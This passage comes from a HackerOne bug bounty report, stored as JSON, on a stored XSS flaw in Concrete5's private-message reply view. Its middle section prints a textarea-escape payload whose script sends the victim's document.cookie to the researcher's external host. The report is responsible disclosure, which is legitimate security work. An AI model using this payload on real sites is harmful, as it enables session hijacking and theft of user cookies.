DNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=76480e204cd5a4ae865f6d07bdde76cb0056f55959c8ecaf5510ff8ba4fe6e94\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/512/0fe841c0e39b607f6f779c59948d36a51ec0f868/pm_stroedxss_2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=76480e204cd5a4ae865f6d07bdde76cb0056f55959c8ecaf5510ff8ba4fe6e94\" class=\"markdown-inline-image\"></a></p>\n\n<ul>\n<li>open message</li>\n</ul>\n\n<p>The content is properly sanitized (no JavaScript executed):</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pm_stroedxss_3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/514/6c7fb53cc99bacadc05353dd8f831c63095a80f0/pm_stroedxss_3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=68df37005ee272ce630b9a9308ad93c898f6a6bef3c500ddb50c7b21542f00e4\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/514/6c7fb53cc99bacadc05353dd8f831c63095a80f0/pm_stroedxss_3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=68df37005ee272ce630b9a9308ad93c898f6a6bef3c500ddb50c7b21542f00e4\" class=\"markdown-inline-image\"></a></p>\n\n<p>Now the fun part begins.</p>\n\n<p>Select <strong>Reply</strong> from the dropdown with message menu. As you can see, content of the original message is embeded below <code>------- Original Message -------</code> separator, however - is <strong>not sanitized</strong>, causes JavaScript script is executed <strong>in context of logged admin</strong> (my sample attack scenario tries to steal cookie to hijack admin session and failed due to <code>Http Only</code> flag set, but it does not change the fact that Stored XSS attack works):</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pm_stroedxss_4.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/513/fb2d95eeb30b341d92a8a8d9749c966dae068fd2/pm_stroedxss_4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5031ef06809a8220b41028eddfb0854a1dc19d32529072f11267813e743825fc\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/513/fb2d95eeb30b341d92a8a8d9749c966dae068fd2/pm_stroedxss_4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5031ef06809a8220b41028eddfb0854a1dc19d32529072f11267813e743825fc\" class=\"markdown-inline-image\"></a></p>\n\n<p>When we inspect HTML source, we can verify that closing <code>&lt;/textarea&gt;</code> tag from payload allows to &quot;escape&quot; from message textarea and append and run JavaScript:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">&quot;form-group&quot;</span><span class=\"nt\">&gt;</span>\n                <span class=\"nt\">&lt;label</span> <span class=\"na\">for=</span><span class=\"s\">&quot;body&quot;</span> <span class=\"na\">class=</span><span class=\"s\">&quot;control-label&quot;</span><span class=\"nt\">&gt;</span>Message<span class=\"nt\">&lt;/label&gt;</span>             <span class=\"nt\">&lt;textarea</span> <span class=\"na\">id=</span><span class=\"s\">&quot;msgBody&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;msgBody&quot;</span> <span class=\"na\">rows=</span><span class=\"s\">&quot;8&quot;</span> <span class=\"na\">class=</span><span class=\"s\">&quot;span5 form-control&quot;</span><span class=\"nt\">&gt;</span>\n\n\n-------------------- Original Message --------------------\nFrom: kotek\nDate Sent: Jul 9, 2017, 9:55 PM\nSubject: Problem with page!!!\n\nHi, could you please take a look at this and reply? Thanks!\n\n<span class=\"nt\">&lt;/textarea&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">createElement</span><span class=\"p\">(</span><span class=\"s1\">&#39;img&#39;</span><span class=\"p\">)</span>\n        <span class=\"nx\">i</span><span class=\"p\">.</span><span class=\"nx\">src</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;https://bl4de.000webhostapp.com/?c=&#39;</span> <span class=\"o\">+</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cookie</span><span class=\"p\">;</span>\n        <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">append</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span>\n    <span class=\"nt\">&lt;/script&gt;&lt;/textarea&gt;</span>            <span class=\"nt\">&lt;/div&gt;</span>\n\n            <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">&quot;ccm-dashboard-form-actions-wrapper&quot;</span><span class=\"nt\">&gt;</span>\n                <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">&quot;ccm-dashboard-form-actions&quot;</span><span class=\"nt\">&gt;</span>\n</code></pre>\n<p>In presented PoC, one cookie was sent and saved on my 000web application:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pm_stroedxss_5.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/515/d503c42b3378cef8248b95266d07321625383eb5/pm_stroedxss_5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=743f654aafc656446f8a3c5d22ecb7ffae1cbb5909d9cc1393fcc30d1a7774a8\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/515/d503c42b3378cef8248b95266d07321625383eb5/pm_stroedxss_5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=743f654aafc656446f8a3c5d22ecb7ffae1cbb5909d9cc1393fcc30d1a7774a8\" class=\"markdown-inline-image\"></a></p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Any user is able to send PM to other user(s) with malicious payload trying to trick them to reply to his message. This scenario is described as <strong>External Attack Vector</strong> in Concrete5 program policy.</p>\n\n<h2 id=\"testing-environment\">Testing environment</h2>\n\n<p>System:</p>\n\n<ul>\n<li>Concrete5 version 8.2.0 RC2, commit 32c9daf352645d4fafedb7b956e7f2de4e153ab3 from July  8th, installed localy</li>\n<li>PHP ver. 5.6.30</li>\n<li>Apache HTTP Server 2.4.25 for macOS</li>\n<li>MySQL ver. 5.7.13 for macOS</li>\n</ul>\n\n<p>This vulnerability was tested on macOS Sierra 10.12.5 with following browsers:</p>\n\n<ul>\n<li>Chrome 59.0.3071.115</li>\n<li>Chromium build 61.0.3131.0</li>\n<li>Opera 46.0.2597.32</li>\n</ul>\n\n<h2 id=\"wrap-up\">Wrap up</h2>\n\n<p>I hope my report will help keep Concrete5 safe in the future.</p>\n\n<p>Best Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.concrete5.org", 
+            "about": "A simple and powerful content management system.", 
+            "twitter_handle": "concrete5", 
+            "name": "concrete5"
+        }, 
+        "handle": "concrete5", 
+        "url": "https://hackerone.com/concrete5", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/060/622f9171a70969f5b0edaf2c826c92ea6e022fb3_small.jpg?1393279055", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/060/80201c838134b35b9b1acd99ad8a7a7c214aa374_medium.jpg?1393279055"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 60, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
